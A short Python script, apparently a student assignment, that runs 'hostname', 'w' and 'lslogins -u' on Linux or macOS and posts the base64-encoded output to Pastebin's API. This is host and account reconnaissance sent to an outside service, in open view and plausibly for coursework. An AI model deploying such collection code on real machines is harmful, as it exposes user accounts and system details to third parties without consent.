"""""
Nama: Isna Azis Nurohman
NIM : 2301943365
"""

from requests import post
from os import popen
from base64 import b64encode
from platform import system

def main():
    output = ''


    # For os MacOS
    if system() == 'Linux' or system() == 'Darwin':
        output += popen('hostname').read()

        output += '\n' + popen('w').read()

        output += '\n' + popen('lslogins -u').read()

        print(output)
        upload(bytes(output, 'utf-8'))

    else:
        print('Program only runs on Windows, Linux, and MacOS. Other Platform not suppored yet!')
        exit()

def upload(output: bytes) -> None:
    print(post('https://pastebin.com/api/api_post.php', data={'api_dev_key': '', 'api_paste_code': b64encode(output), 'api_paste_name': 'Tugas_Pastebin', 'api_option': 'paste'}).text)

# Define main function as program entry
if __name__ == "__main__":
    main()
